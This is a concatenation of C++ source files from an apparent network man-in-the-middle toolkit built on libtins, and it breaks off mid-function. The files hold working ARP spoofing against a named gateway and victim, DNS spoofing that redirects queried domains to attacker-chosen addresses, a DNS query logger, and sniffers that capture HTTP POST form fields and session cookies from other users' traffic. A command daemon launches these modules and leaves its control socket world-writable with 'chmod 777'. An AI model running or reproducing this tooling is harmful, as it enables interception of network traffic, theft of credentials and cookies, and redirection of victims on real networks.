#include "Addresses.hh"

Addresses::Addresses(const HWAddress<6> &mac, const IPv4Address &ip) : _mac(mac), _ip(ip) { }

Addresses::Addresses(void) { }

const HWAddress<6> Addresses::mac(void) const { return _mac; }

void Addresses::mac(const HWAddress<6> newMac) { _mac = newMac; }

const IPv4Address Addresses::ip(void) const { return _ip; }

void Addresses::ip(const IPv4Address newIp) { _ip = newIp; }
/*
 * Copyright (c) 2014, Matias Fontanini
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * * Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above
 *   copyright notice, this list of conditions and the following disclaimer
 *   in the documentation and/or other materials provided with the
 *   distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <unistd.h>
#include <tins/arp.h>
#include <tins/network_interface.h>
#include <tins/utils.h>
#include <tins/ethernetII.h>
#include <tins/packet_sender.h>

using namespace std;
using namespace Tins;


void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
  const NetworkInterface::Info &info)
{
    PacketSender sender;
    EthernetII::address_type gw_hw, victim_hw;

    // Resolves gateway's hardware address.
    gw_hw = Utils::resolve_hwaddr(iface, gw, sender);

    // Resolves victim's hardware address.
    victim_hw = Utils::resolve_hwaddr(iface, victim, sender);

    // Print out the hw addresses we're using.
    cout << " Using gateway hw address: " << gw_hw << "\n";
    cout << " Using victim hw address:  " << victim_hw << "\n";
    cout << " Using own hw address:     " << info.hw_addr << "\n";

    /* We tell the gateway that the victim is at out hw address,
     * and tell the victim that the gateway is at out hw address */
    ARP gw_arp(gw, victim, gw_hw, info.hw_addr),
        victim_arp(victim, gw, victim_hw, info.hw_addr);
    // We are "replying" ARP requests
    gw_arp.opcode(ARP::REPLY);
    victim_arp.opcode(ARP::REPLY);

    /* The packet we'll send to the gateway and victim.
     * We include our hw address as the source address
     * in ethernet layer, to avoid possible packet dropping
     * performed by any routers. */
    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
    while(true) {
        // Just send them once every 5 seconds.
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(5);
    }
}

int main(int argc, char *argv[]) {
    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
        return 1;
    IPv4Address gw, victim;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer.
        gw     = argv[1];
        victim = argv[2];
    }
    catch(...) {
        cout << "Invalid ip found...\n";
        return 2;
    }

    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        // Get the interface which will be the gateway for our requests.
        iface = gw;
        // Lookup the interface id. This will be required while forging packets.
        // Find the interface hardware and ip address.
        info = iface.addresses();
    }
    catch(std::runtime_error &ex) {
        cout << ex.what() << endl;
        return 3;
    }
    try {
        do_arp_spoofing(iface, gw, victim, info);
    }
    catch(std::runtime_error &ex) {
        std::cout << "Runtime error: " << ex.what() << std::endl;
        return 7;
    }
}
#include "ASender.hh"

ASender::ASender(const NetworkInterface &iface, const std::string &name, std::ostream *out) : _iface(iface), _name(name), _out(out) { }

const std::string ASender::getDate(void) const
{
    time_t     now = time(0);
    struct tm  tstruct;
    char       buf[80];

    tstruct = *localtime(&now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);

    return buf;
}

const std::string &ASender::name(void) const { return _name; }
#include "ASniffer.hh"

ASniffer::ASniffer(const NetworkInterface &iface, const std::string &name, const std::string &filter, std::ostream *out)
    : AModule(iface, name, out), _sniffer(_iface.name(), Sniffer::PROMISC, filter)
{
}

void ASniffer::sniff(void)
{
    _sniffer.sniff_loop(make_sniffer_handler(this, &ASniffer::handler));
}

void ASniffer::start(void)
{
    std::thread     t(&ASniffer::sniff, this);

    t.detach();
}

void ASniffer::stop(void)
{
    _sniffer.stop_sniff();
}
#include "Daemon.hh"

Daemon::Daemon(const std::string &path, const std::string &iface)
    : _local(path, DomainSocket::SERVER), _run(false), _launcher(iface)
{
    std::string     chmod("chmod 777 " + path);

    system(chmod.c_str());
}

Daemon::~Daemon(void)
{
    for (DomainSocket* client : _clients)
    {
        delete client;
    }
}

void Daemon::start(void)
{
    _run = true;
    while (_run)
    {
        try
        {
            handleSockets();
        }
        catch (std::runtime_error &e)
        {

        }
    }
}

void Daemon::handleSockets(void)
{
    fd_set              readfds;
    fd_set              writefds;
    int                 fd_max;
    struct timeval      tv;

    fd_max = initSelect(&tv, &readfds, &writefds);
    if (::select(fd_max, &readfds, NULL, NULL, &tv) == -1)
    {
        throw std::runtime_error(std::string("Select Error : ") + ::strerror(errno));
    }
    else
    {
//        // If something to read on stdin
//        if (FD_ISSET(0, &readfds))
//            eventTerminal();
        // If new client connect
        if (FD_ISSET(_local.fd(), &readfds))
            eventServer();
        // Check clients's socket
        eventClients(&readfds, &writefds);
    }

}

int Daemon::initSelect(struct timeval *tv, fd_set *readfds, fd_set *writefds)
{
    int     fd_max = _local.fd();

    // Timeout 100 ms
    tv->tv_sec = 0;
    tv->tv_usec = 100;

    // Initialize bits field for select
    FD_ZERO(readfds);
    FD_SET(_local.fd(), readfds);
//    FD_SET(0, readfds);
    if (writefds != NULL)
    {
        FD_ZERO(writefds);
        FD_SET(_local.fd(), writefds);
    }
    for (DomainSocket *client : _clients)
    {
        FD_SET(client->fd(), readfds);
        if (writefds != NULL)
            FD_SET(client->fd(), writefds);
        // Check if client's fd is greater than actual fd_max
        fd_max = (fd_max < client->fd()) ? client->fd() : fd_max;
    }
    return fd_max + 1;
}

void Daemon::eventTerminal(void)
{
    std::string     msg;

    std::cin >> msg;
    if (msg == "exit")
    {
        _run = false;
    }
}

void Daemon::eventServer(void)
{
    DomainSocket    *client;

    try
    {
        client = _local.acceptClient();
        _clients.push_back(client);
    }
    catch (std::runtime_error &e)
    {
        std::cout << e.what() << std::endl;
    }
}

void Daemon::eventClients(fd_set *readfds, fd_set *writefds)
{
    std::string         msg;

    for (std::vector<DomainSocket*>::iterator it = _clients.begin(); it < _clients.end(); ++it)
    {
        // Something to write on client socket
        if (FD_ISSET((*it)->fd(), writefds))
        {
            try
            {
                (*it)->sendMsg();
            }
            catch (std::runtime_error &e)
            {
                // No message to send
            }
        }
        // Something to read on client socket
        if (FD_ISSET((*it)->fd(), readfds))
        {
            try
            {
                (*it)->recvMsg();
                msg = (*it)->getMsg();                
                (*it)->addMsg(_launcher.readCmdLine(msg));
            }
            catch (DomainSocket::Disconnected &e)
            {
                delete (*it);
                _clients.erase(it);
                it = _clients.begin();
            }
            catch (Launcher::Stop &e)
            {
                _run = false;
                (*it)->addMsg("Stop cameleon-daemon");
                (*it)->sendMsg();
            }
            catch (std::runtime_error &e)
            {
                std::cout << e.what() << std::endl;
            }
        }
    }

}
#include "DnsDump.hh"

DnsDump::DnsDump(const NetworkInterface &iface, std::ostream *out, const std::string &filename)
    : ASniffer(iface, "DnsDump", "udp and dst port 53", out), _filename(filename)
{
}

DnsDump::~DnsDump(void)
{
    static_cast<std::ofstream*>(_out)->close();
}

bool DnsDump::handler(PDU &pdu)
{
    // EthernetII / IP / UDP / RawPDU
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if(dns.type() == DNS::QUERY)
    {
        // Let's see if there's any query for an "A" record.
        for(const DNS::Query &query : dns.queries())
        {
            if(query.type() == DNS::A)
                *_out << getDate() << "\t" << ip.src_addr() << "  -->  " << query.dname() << std::endl;
        }
    }
    return true;
}

std::string DnsDump::info(void) const
{
    return "Filename = " + _filename;
}

std::string DnsDump::help(void)
{
    return std::string("Start DNS queries dumper.\n") + "\tOptions : <file>";
}
/*
 * Copyright (c) 2014, Matias Fontanini
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 *
 * * Redistributions of source code must retain the above copyright
 *   notice, this list of conditions and the following disclaimer.
 * * Redistributions in binary form must reproduce the above
 *   copyright notice, this list of conditions and the following disclaimer
 *   in the documentation and/or other materials provided with the
 *   distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <tins/tins.h>
#include <iostream>

using namespace Tins;

PacketSender sender;

bool callback(const PDU &pdu)
{
    // The packet probably looks like this:
    //
    // EthernetII / IP / UDP / RawPDU
    //
    // So we retrieve each layer, and construct a
    // DNS PDU from the RawPDU layer contents.
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if(dns.type() == DNS::QUERY) {
        // Let's see if there's any query for an "A" record.
        for(const auto &query : dns.queries()) {
            if(query.type() == DNS::A) {
                // Here's one! Let's add an answer.
                dns.add_answer(
                    DNS::Resource(
                        query.dname(),
                        "31.192.116.24",
                        DNS::A,
                        query.query_class(),
                        // 777 is just a random TTL
                        777
                    )
                );
            }
        }
        // Have we added some answers?
        if(dns.answers_count() > 0) {
            // It's a response now
            dns.type(DNS::RESPONSE);
            // Recursion is available(just in case)
            dns.recursion_available(1);
            // Build our packet
            auto pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                        IP(ip.src_addr(), ip.dst_addr()) /
                        UDP(udp.sport(), udp.dport()) /
                        dns;
            // Send it!
            sender.send(pkt);
        }
    }
    return true;
}

int main(int argc, char *argv[])
{
    if(argc != 2) {
        std::cout << "Usage: " << *argv << " <interface>" << std::endl;
        return 1;
    }
    // Sniff on the provided interface in promiscuos mode
    Sniffer sniffer(argv[1], Sniffer::PROMISC);

    // Only capture udp packets sent to port 53
    sniffer.set_filter("udp and dst port 53");

    // All packets will be sent through the provided interface
    sender.default_interface(argv[1]);

    // Start the capture
    sniffer.sniff_loop(callback);
}
#include "DnsSpoof.hh"

DnsSpoof::DnsSpoof(const NetworkInterface &iface, std::ostream *out, const std::string &file)
    : ASniffer(iface, "DnsSpoof", "udp and dst port 53", out)
{
    readHosts(file);
}

void DnsSpoof::readHosts(const std::string &file)
{
    std::ifstream   fs(file);
    std::string     host, ip;

    while (fs >> ip >> host)
        _spoofedHosts[host] = ip;
}

std::string DnsSpoof::info(void) const
{
    return "Hostfile = " + _file;
}

std::string DnsSpoof::help(void)
{
    std::string rep;

    rep += "Start DNS spoofing attack for domains in file.\n";
    rep += "Host file must have the form : ip_adress domain\n";
    rep += "\tOptions : <hostfile>";

    return rep;
}

bool DnsSpoof::handler(PDU &pdu)
{
    // EthernetII / IP / UDP / RawPDU
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    UDP udp = ip.rfind_pdu<UDP>();
    DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

    // Is it a DNS query?
    if(dns.type() == DNS::QUERY)
    {
        std::map<std::string, std::string>::iterator  it;

        // Let's see if there's any query for an "A" record.
        for(const DNS::Query &query : dns.queries())
        {
            if(query.type() == DNS::A)
            {
                if ((it = _spoofedHosts.find(query.dname())) != _spoofedHosts.end())
                {
                    dns.add_answer(DNS::Resource(query.dname(), it->second, DNS::A, query.query_class(), 111));
                }
            }
        }

        // Have we added some answers?
        if(dns.answers_count() > 0)
        {
            // It's a response now
            dns.type(DNS::RESPONSE);
            // Recursion is available(just in case)
            dns.recursion_available(1);
            // Build our packet
            EthernetII pkt = EthernetII(eth.src_addr(), eth.dst_addr()) /
                                IP(ip.src_addr(), ip.dst_addr()) /
                                UDP(udp.sport(), udp.dport()) /
                                dns;
            // Send it!
            _sender.send(pkt, _iface);
        }
    }
    return true;
}
#include "DomainSocket.hh"

DomainSocket::DomainSocket(const std::string &path, DomainSocket::TYPE type) : _run(false), _type(type)
{
    _socket.sun_family = AF_UNIX;
    ::strncpy(_socket.sun_path, path.c_str(), path.length());

    if ((_fd = ::socket(AF_UNIX, SOCK_STREAM, 0)) == -1)
    {
        throw std::runtime_error(strerror(errno));
    }

    // Server Socket
    if (_type == DomainSocket::SERVER)
    {
        ::unlink(path.c_str());
        if (::bind(_fd, (struct sockaddr*)&_socket, path.length() + sizeof(_socket.sun_family)) == -1)
        {
            throw std::runtime_error(strerror(errno));
        }
        else if (::listen(_fd, 5) == -1)
        {
            throw std::runtime_error(strerror(errno));
        }
        else
        {
            _run = true;
        }
    }
    else if (_type == DomainSocket::CLIENT)
    {
        if (::connect(_fd, (struct sockaddr*)&_socket, path.length() + sizeof(_socket.sun_family)) == -1)
        {
            throw std::runtime_error(strerror(errno));
        }
        else
        {
            _run =  true;
        }
    }
    else
    {
        throw std::runtime_error("Wrong constructor for a Server_Client socket.");
    }
}

DomainSocket::DomainSocket(int fd, const sockaddr_un *socket) : _run(true), _type(DomainSocket::SERVER_CLIENT), _fd(fd)
{
    std::memcpy(&_socket, socket, strlen(socket->sun_path) + sizeof(socket->sun_family));
}

DomainSocket::~DomainSocket(void)
{
    if (_run)
        ::close(_fd);
}

DomainSocket *DomainSocket::acceptClient(void)
{
    int                 remoteFd;
    struct sockaddr_un  remoteSocket;
    socklen_t           size = sizeof(remoteSocket);

    if (_type != DomainSocket::SERVER)
    {
        throw std::runtime_error("This is not a server socket");
    }

    if ((remoteFd = ::accept(_fd, (struct sockaddr*)&remoteSocket, &size)) == -1)
    {
        throw std::runtime_error(strerror(errno));
    }
    return new DomainSocket(remoteFd, &remoteSocket);
}


void DomainSocket::sendMsg(void)
{
    std::string     msg;

    if (_type == DomainSocket::SERVER)
    {
        throw std::runtime_error("This is a server socket");
    }

    if (_sendQueue.size() == 0)
    {
        throw std::runtime_error("No message in send queue");
    }

    msg = _sendQueue.front();
    if (send(_fd, msg.c_str(), msg.size(), 0) == -1)
    {
        throw std::runtime_error(strerror(errno));
    }
    _sendQueue.pop();
}

void DomainSocket::recvMsg(void)
{
    char        buf[BUF_SIZE] = {0};
    std::string msg;
    int         len;

    if (_type == DomainSocket::SERVER)
    {
        throw std::runtime_error("This is a server socket");
    }

    if ((len = recv(_fd, buf, BUF_SIZE, 0)) == -1)
    {
        throw std::runtime_error(strerror(errno));
    }
    else if (_type == DomainSocket::SERVER_CLIENT && len == 0) // Server_Client disconnected from server
    {
        throw DomainSocket::Disconnected();
    }

    msg.assign(buf, len);
    _recvQueue.push(msg);
}

void DomainSocket::addMsg(const std::string &msg)
{
    _sendQueue.push(msg);
}

const std::string DomainSocket::getMsg(void)
{
    std::string     msg;

    if (_recvQueue.size() == 0)
    {
        throw std::runtime_error("No message in recv queue");
    }
    msg = _recvQueue.front();
    _recvQueue.pop();
    return msg;
}

void DomainSocket::closeSocket(void)
{
    if (_run)
        close(_fd);
}


/* GETTERS / SETTERS */
bool DomainSocket::isRunning(void) const { return _run; }

int DomainSocket::fd(void) const { return _fd; }

const sockaddr_un *DomainSocket::socket(void) const { return &_socket; }

bool DomainSocket::somethingToSend() const { return _sendQueue.size() == 0 ? false : true; }

bool DomainSocket::somethingToRecv() const { return _recvQueue.size() == 0 ? false : true; }
#include "HttpCookieSniffer.hh"

HttpCookieSniffer::HttpCookieSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename, const std::vector<std::string> &keys)
    : ASniffer(interface, "HttpCookieSniffer", "tcp and dst port 80", out), _filename(filename), _keys(keys)
{
}


std::string HttpCookieSniffer::help(void)
{
    return std::string("Start HttpCookieSniffer.\n") + "\tOptions : <filename> [keys]";
}

bool HttpCookieSniffer::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    Tins::RawPDU::payload_type payload = tcp.rfind_pdu<RawPDU>().payload();
    std::stringstream       ss;

    for (u_int8_t data : payload)
        ss << data;

    HTTP        http(ss);
    std::string value;

    try
    {        
        for (std::string key : _keys)
        {
            value = http.getCookie(key); // Throw exception if key not exist
            *_out << http.getHeader("Host") << "\t" << key << " = " << value << std::endl;
        }
    }
    catch (std::out_of_range &e)
    {
        // Key not present
    }
    return true;
}

std::string HttpCookieSniffer::info(void) const
{
    std::string     keys;

    for (std::string key : _keys)
        keys += key + " ";

    return "Keys = " + keys + ", File =  " + _filename;
}
#include "Http.hh"

HTTP::HTTP(std::stringstream &ss)
{
    int             sep;

    ss >> _verb;
    ss >> _location;
    ss >> _version;
    for (std::string line; std::getline(ss, line);)
    {
        try
        {
            if ((sep = line.find(':')) != -1)
            {
                std::string value = line.substr(sep + 2);

                // Remove annoying '\r'
                value.pop_back();
                _headers[line.substr(0, sep)] = value;

                // Get all cookies
                if (line.substr(0, sep) == "Cookie")
                    parseCookies(line.substr(sep + 2));
            }
            else if (_verb == "POST")
            {
                // If there is data on line (and not only \n)
                if (line.length() > 1)
                    parseData(line);
            }
        }
        catch (std::out_of_range &e)
        {

        }
    }
}

const std::string HTTP::getHeader(const std::string &key) const
{
    std::map<std::string, std::string>::const_iterator it = _headers.find(key);

    if (it == _headers.end())
        throw std::out_of_range("Header " + key + " don't exist");
    return it->second;
}

const std::string HTTP::getCookie(const std::string &key) const
{
    std::map<std::string, std::string>::const_iterator it = _cookies.find(key);

    if (it == _cookies.end())
        throw std::out_of_range("Cookie " + key + " don't exist");
    return it->second;
}

const std::string HTTP::getValue(const std::string &key) const
{
    std::map<std::string, std::string>::const_iterator it = _data.find(key);

    if (it == _data.end())
        throw std::out_of_range("Key " + key + " don't exist");
    return it->second;
}

void HTTP::parseData(const std::string &buf)
{
    std::istringstream  ss(buf);
    int                 sep;

    for (std::string pair; std::getline(ss, pair, '&');)
    {
        sep = pair.find('=');
        _data[pair.substr(0, sep)] = pair.substr(sep + 1);
    }
}

void HTTP::parseCookies(const std::string &buf)
{
    std::istringstream  ss(buf);
    int                 i = 0;
    int                 sep;
    std::string         value;

    for (std::string pair; std::getline(ss, pair, ';');)
    {
        try
        {
            sep = pair.find('=');
            value = pair.substr(sep + 1);
            value.pop_back();
            if (i++ > 0)
                _cookies[pair.substr(1, sep - 1)] = value;
            else
                _cookies[pair.substr(0, sep)] = value;
        }
        catch (std::out_of_range &e)
        {

        }
    }
}

const std::string &HTTP::verb(void) const { return _verb; }

const std::string &HTTP::location(void) const { return _location; }

const std::string &HTTP::version(void) const { return _version; }

const std::map<std::string, std::string> &HTTP::headers(void) const { return _headers; }

const std::map<std::string, std::string> &HTTP::data(void) const { return _data; }

const std::map<std::string, std::string> &HTTP::cookies(void) const { return _cookies; }
#include "HttpPostSniffer.hh"

HttpPostSniffer::HttpPostSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename, const std::vector<std::string> &keys)
    : ASniffer(interface, "HttpPostSniffer", "tcp and dst port 80", out), _filename(filename), _hostname("All"), _type(HttpPostSniffer::KEYS), _keys(keys)
{
}

HttpPostSniffer::HttpPostSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename, const std::string &hostname)
    : ASniffer(interface, "HttpPostSniffer", "tcp and dst port 80", out), _filename(filename), _hostname(hostname), _type(HttpPostSniffer::HOSTNAME)
{
}

HttpPostSniffer::HttpPostSniffer(const NetworkInterface &interface, std::ostream *out, const std::string &filename)
    : ASniffer(interface, "HttpPostSniffer", "tcp and dst port 80", out), _filename(filename), _hostname("All"), _type(HttpPostSniffer::ALL)
{
}

std::string HttpPostSniffer::info(void) const
{
    std::string     msg;
    std::string     keys;

    if (_type == HttpPostSniffer::KEYS)
    {
        msg += "Keys = ";
        for (std::string key : _keys)
            msg += key + " ";
    }
    else if (_type == HttpPostSniffer::HOSTNAME)
        msg += "Hostname = " + _hostname;
    else if (_type == HttpPostSniffer::ALL)
        msg += "Hostname = ALL";

    return msg + ", File = " + _filename;
}

std::string HttpPostSniffer::help(void)
{
    return std::string("Start HttpPostSniffer.\n") + "\tOptions : <all | keys | host> <filename> [keys | hostname]";
}

bool HttpPostSniffer::handler(PDU &pdu)
{
    // EthernetII / IP / TCP
    EthernetII eth = pdu.rfind_pdu<EthernetII>();
    IP ip = eth.rfind_pdu<IP>();
    TCP tcp = ip.rfind_pdu<TCP>();

    Tins::RawPDU::payload_type payload = tcp.rfind_pdu<RawPDU>().payload();
    std::stringstream       ss;

    for (u_int8_t data : payload)
        ss << data;

    HTTP        http(ss);

    if (http.verb() == "POST")
    {        
        if (_type == HttpPostSniffer::KEYS)
            sniffKeys(http, ip.src_addr());
        else if (_type == HttpPostSniffer::HOSTNAME)
            sniffHostname(http, ip.src_addr());
        else if (_type == HttpPostSniffer::ALL)
            sniffAll(http, ip.src_addr());
    }
    return true;
}

void HttpPostSniffer::sniffKeys(const HTTP &http, Tins::IP::address_type ip)
{
    std::string     value;

    try
    {
        for (std::string key : _keys)
        {
            value = http.getValue(key);
            *_out << http.getHeader("Host") << " from " << ip << "\t" << key << " = " << value << std::endl;
        }
        *_out << std::endl;
    }
    catch (std::out_of_range &e)
    {
        // Key not present
    }
}

void HttpPostSniffer::sniffHostname(const HTTP &http, Tins::IP::address_type ip)
{
    try
    {
        if (_hostname == http.getHeader("Host"))
        {
            *_out << _hostname << " from " << ip << std::endl;
            // Dump all post data
            for (std::pair<std::string, std::string> data : http.data())
            {
                *_out << "\t" << data.first << " = " << data.second << std::endl;
            }
            *_out << std::endl;
        }
    }
    catch (std::out_of_range &e)
    {
    }
}

void HttpPostSniffer::sniffAll(const HTTP &http, Tins::IP::address_type ip)
{
    try
    {
        *_out << http.getHeader("Host") << " from " << ip <<  std::endl;
        // Dump all post data
        for (std::pair<std::string, std::string> data : http.data())
        {
            *_out << "\t" << data.first << " = " << data.second << std::endl;
        }
        *_out << std::endl;
    }
    catch (std::out_of_range &e)
    {
    }
}
#include "Launcher.hh"

Launcher::Launcher(const std::string &iface)
    : _run(false), _iface(iface)
{
    // Commands
    _commands["help"] = &Launcher::help;
    _commands["exit"] = &Launcher::exit;
    _commands["start"] = &Launcher::start;
    _commands["stop"] = &Launcher::stop;
    _commands["list"] = &Launcher::list;
    _commands["ps"] = &Launcher::ps;

    // Modules
    _commands["dnsspoof"] = &Launcher::startDnsSpoof;
    _commands["dnsdump"] = &Launcher::startDnsDump;
    _commands["httppostsniffer"] = &Launcher::startHttpPostSniffer;
    _commands["httpcookiesniffer"] = &Launcher::startHttpCookieSniffer;
    _commands["mitm"] = &Launcher::startMitm;
    _commands["tcpkill"] = &Launcher::startTcpKill;
}

Launcher::~Launcher(void)
{
    for (std::map<std::string, AModule*>::iterator   it = _modules.begin(); it != _modules.end(); ++it)
        delete (*it).second;

    // Disable ip forward
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
}

const std::string Launcher::readCmdLine(const std::string &line)
{
    std::map<std::string, Command>::iterator    it;
    std::string             cmd;
    Command                 fptr;
    std::istringstream      iss(line);

    _rep.str("");
    _rep.clear();
    iss >> cmd;
    it = _commands.find(cmd);
    if (it == _commands.end())
        help(iss);
    else
    {
        fptr = (*it).second;
        (this->*fptr)(iss);
    }
    return _rep.str();
}


/* COMMANDS */
void Launcher::help(std::istringstream &iss)
{
    (void)iss;
    _rep << "Available commands : " << std::endl;
    _rep << "\tstart <module> <instance name> [options] : Start module" << std::endl;
    _rep << "\tstop <instance name> : Stop module" << std::endl;
    _rep << "\tlist : Display availables modules" << std::endl;
    _rep << "\tps : Display started modules" << std::endl;
    _rep << "\thelp : Display this help" << std::endl;
    _rep << "\tquit : Exit";
}

void Launcher::exit(std::istringstream &iss)
{
    (void)iss;
    stopModules();
    _run = false;
    throw Launcher::Stop();
}

void Launcher::start(std::istringstream &iss)
{
    std::map<std::string, Command>::iterator    it;
    std::string     module;
    Command         fptr;

    iss >> module;
    if (module.length())
    {
        it = _commands.find(module);
        if (it == _commands.end())
        {
            list(iss);
            help(iss);
        }
        else
        {
            fptr = (*it).second;
            (this->*fptr)(iss);
        }
    }
    else
        help(iss);
}

void Launcher::stop(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;

    iss >> name;
    if (!name.length())
        help(iss);
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
            _rep << "Module " << name << " doesn't exist !";
        else
        {
            // Stop the module and delete it
            (*it).second->stop();
            delete (*it).second;
            _modules.erase(name);
            _rep << "Module " << name << " successfully stopped";
        }
    }
}

void Launcher::list(std::istringstream &iss)
{
    (void)iss;
    _rep << "Availables modules : ";
    for (std::pair<std::string, Command> pair : _commands)
        _rep << pair.first << " ";
}

void Launcher::ps(std::istringstream &iss)
{
    (void)iss;
    if (_modules.size())
    {
        _rep << std::setw(22) << std::left << "Module" << std::setw(20) << std::left << "Name" << std::setw(15) << std::left << "Options" << std::endl << std::endl;
        for (std::pair<std::string, AModule*> pair : _modules)
            _rep << std::setw(22) << std::left << pair.second->name() << std::setw(20) << std::left << pair.first << std::setw(15) << std::left << pair.second->info() << std::endl;
    }
    else
    {
        _rep << "No module actually running.";
    }
}

void Launcher::stopModules(void)
{
    for (std::pair<std::string, AModule*> pair : _modules)
    {
        _rep << "Stopping module " << pair.first;
        pair.second->stop();
    }
}

/* MODULES STARTER */
void Launcher::startDnsSpoof(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     hostfile;

    iss >> name;
    iss >> hostfile;
    if (!name.length())
        help(iss);
    else if (!hostfile.length())
        _rep << "Bad parameters." << std::endl << DnsSpoof::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            _modules[name] = new DnsSpoof(_iface, &_rep, hostfile);
            _modules[name]->start();
            _rep << "DnsSpoof started : hostfile=" + hostfile;
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startDnsDump(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     file;

    iss >> name;
    iss >> file;
    if (!name.length())
        help(iss);
    else if (!file.length())
        _rep << "Bad parameters." << std::endl << DnsDump::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(file); // Close fd ? Where ?
            _modules[name] = new DnsDump(_iface, fd, file);
            _modules[name]->start();
            _rep << "DnsDump started : file=" + file;
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startHttpPostSniffer(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator   it;
    std::string                                 name;
    std::string                                 type;
    std::string                                 filename;

    iss >> name;
    iss >> type;
    iss >> filename;
    if (!name.length())
        help(iss);
    else if (!type.length() || !filename.length())
        _rep << "Bad parameters." << std::endl << HttpPostSniffer::help() << std::endl;
    else
    {
        it = _modules.find(name);
        if (it != _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(filename);
            // If Type KEYS
            if (type == "keys")
            {
                std::string                 key;
                std::vector<std::string>    vKeys;

                iss >> key;
                if (!key.length())
                    _rep << "Bad parameters." << std::endl << HttpPostSniffer::help() << std::endl;
                else
                {
                    // Push first key and then other keys
                    vKeys.push_back(key);
                    while (iss >> key)
                        vKeys.push_back(key);
                    _modules[name] = new HttpPostSniffer(_iface, fd, filename, vKeys);
                }
            }
            else if (type == "host") // If Type HOSTNAME
            {
                std::string                 hostname;

                iss >> hostname;
                if (!hostname.length())
                    _rep << "Bad parameters." << std::endl << HttpPostSniffer::help() << std::endl;
                else
